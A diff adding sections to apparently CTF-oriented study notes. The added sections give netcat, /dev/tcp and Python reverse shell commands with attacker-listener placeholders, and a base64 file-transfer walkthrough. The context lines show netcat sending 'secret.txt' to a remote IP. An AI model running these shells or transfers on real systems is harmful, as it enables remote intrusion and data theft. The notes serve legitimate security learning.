@@ -378,6 +378,151 @@ L→Client  |   nc 172.16.82.106 1111 < secret.txt
           |   Receiver: cat < /dev/tcp/10.10.0.40/1111 > secret.txt  
 
 -----------------------------------------------------------------------------------------------------------------------------------------
+                                             Reverse Shell using Netcat
+-----------------------------------------------------------------------------------------------------------------------------------------
+                                                  Reverse Shells
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+Listener (attacker machine):
+    nc -lvp 9999
+    → Port `9999` can be changed to any unused port on your system.
+
+Victim using `-c` option:
+    nc -c /bin/bash IP_ADDRESS PORT
+    → Replace `IP_ADDRESS` with your listener's IP (e.g., 10.10.0.40)  
+    → Replace `PORT` with the same port used above (e.g., 9999)
+
+Victim using `-e` option:
+    nc -e /bin/bash IP_ADDRESS PORT
+    → Same replacements as above.
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+                                             Reverse Shell using /dev/tcp
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+Listener (attacker machine):
+    nc -lvp 9999
+
+Victim:
+    /bin/bash -i > /dev/tcp/IP_ADDRESS/PORT 0<&1 2>&1
+    → Replace `IP_ADDRESS` with your listener's IP  
+    → Replace `PORT` with your listening port
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+                                             Reverse Shell using Python3
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+Python3 Listener Script:
+    PORT = 1234
+    → You can change `1234` to any unused port
+
+    server.bind(('', PORT))
+    → Leave empty string `''` to bind to all interfaces
+
+    # No IP changes needed unless you want to bind to a specific interface
+
+    # This script runs on the attacker's machine and waits for incoming connections.
+    # The victim would need a matching Python client to connect and send commands.
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+                                             Title: Topic – ASCII to Base64 File Transfer
+-----------------------------------------------------------------------------------------------------------------------------------------
+                                              ASCII to Base64 File Transfer (Simplified)
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+🔹 Convert ASCII to Base64
+- Example: "Test"
+- Binary: T = 01010100, e = 01100101, s = 01110011, t = 01110100
+- Group into 6-bit chunks → Map to Base64 table
+- Result: VGVzdA==
+- Add "=" padding if needed
+
+🔹 Encode a File to Base64 (No Line Wrap)
+base64 -w0 FILE_NAME
+→ Example: base64 -w0 logoCyber.png
+
+🔹 Transfer the Base64 Output
+1. Create a new file: nano b64image.txt
+2. Paste the Base64 output, save & exit
+
+🔹 Decode Base64 Back to Original File
+base64 -d b64image.txt > logoCyber.png
+
+✅ Done! File transferred via Base64
+
+-----------------------------------------------------------------------------------------------------------------
+                 Base64 Encoding Table (Quick Reference)
+-----------------------------------------------------------------------------------------------------------------
+| Index | Binary  | Char |   | Index | Binary  | Char |   | Index | Binary  | Char |   | Index | Binary  | Char |
+|-------|---------|------|---|-------|---------|------|---|-------|---------|------|---|-------|---------|------|
+|   0   | 000000  |  A   |   |  16   | 010000  |  Q   |   |  32   | 100000  |  g   |   |  48   | 110000  |  w   |
+|   1   | 000001  |  B   |   |  17   | 010001  |  R   |   |  33   | 100001  |  h   |   |  49   | 110001  |  x   |
+|   2   | 000010  |  C   |   |  18   | 010010  |  S   |   |  34   | 100010  |  i   |   |  50   | 110010  |  y   |
+|   3   | 000011  |  D   |   |  19   | 010011  |  T   |   |  35   | 100011  |  j   |   |  51   | 110011  |  z   |
+|   4   | 000100  |  E   |   |  20   | 010100  |  U   |   |  36   | 100100  |  k   |   |  52   | 110100  |  0   |
+|   5   | 000101  |  F   |   |  21   | 010101  |  V   |   |  37   | 100101  |  l   |   |  53   | 110101  |  1   |
+|   6   | 000110  |  G   |   |  22   | 010110  |  W   |   |  38   | 100110  |  m   |   |  54   | 110110  |  2   |
+|   7   | 000111  |  H   |   |  23   | 010111  |  X   |   |  39   | 100111  |  n   |   |  55   | 110111  |  3   |
+|   8   | 001000  |  I   |   |  24   | 011000  |  Y   |   |  40   | 101000  |  o   |   |  56   | 111000  |  4   |
+|   9   | 001001  |  J   |   |  25   | 011001  |  Z   |   |  41   | 101001  |  p   |   |  57   | 111001  |  5   |
+|  10   | 001010  |  K   |   |  26   | 011010  |  a   |   |  42   | 101010  |  q   |   |  58   | 111010  |  6   |
+|  11   | 001011  |  L   |   |  27   | 011011  |  b   |   |  43   | 101011  |  r   |   |  59   | 111011  |  7   |
+|  12   | 001100  |  M   |   |  28   | 011100  |  c   |   |  44   | 101100  |  s   |   |  60   | 111100  |  8   |
+|  13   | 001101  |  N   |   |  29   | 011101  |  d   |   |  45   | 101101  |  t   |   |  61   | 111101  |  9   |
+|  14   | 001110  |  O   |   |  30   | 011110  |  e   |   |  46   | 101110  |  u   |   |  62   | 111110  |  +   |
+|  15   | 001111  |  P   |   |  31   | 011111  |  f   |   |  47   | 101111  |  v   |   |  63   | 111111  |  /   |
+-----------------------------------------------------------------------------------------------------------------
+🔸 Padding character: "=" is used when input isn’t a multiple of 3 bytes.
+-----------------------------------------------------------------------------------------------------------------------------------------
+                                             Section: ASCII to Base64 Conversion
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+          | Concept: Convert readable ASCII data into Base64 format  
+a2b       | Use Case: Encode files for transfer over text-only channels  
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+                                             Section: Generate Base64 Output of a File
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+          | Command:  
+Base64    |   base64 -w0 FILE_NAME  
+          | Example:  
+          |   base64 -w0 logoCyber.png  
+          | Notes:  
+          |   - `-w0` removes line wrapping for clean output  
+          |   - Replace `FILE_NAME` with the actual file you want to encode  
+          |   - Copy the output for transfer  
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+                                             Section: Transfer File with Base64
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+          | Step 1 – Create a new file to hold Base64 data:  
+Transfer   |   nano NEW_FILE_NAME  
+          | Example:  
+          |   nano b64image.png  
+          |   → Paste the copied Base64 output  
+          |   → Save and exit  
+
+          | Step 2 – Decode Base64 back to original file:  
+          |   base64 -d NEW_FILE_NAME > ORIGINAL_FILE_NAME  
+          | Example:  
+          |   base64 -d b64image.png > logoCyber.png  
+          | Notes:  
+          |   - `NEW_FILE_NAME` is the file containing Base64 text  
+          |   - `ORIGINAL_FILE_NAME` is the restored binary file  
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+                                             Section: Final Steps
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+          | Task: Confirm successful file transfer and redirection  
+Complete   | Action: Check intel on the CTF server for updates  
+          | Purpose: Validate mission progress and receive new objectives  
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+
 
 
 
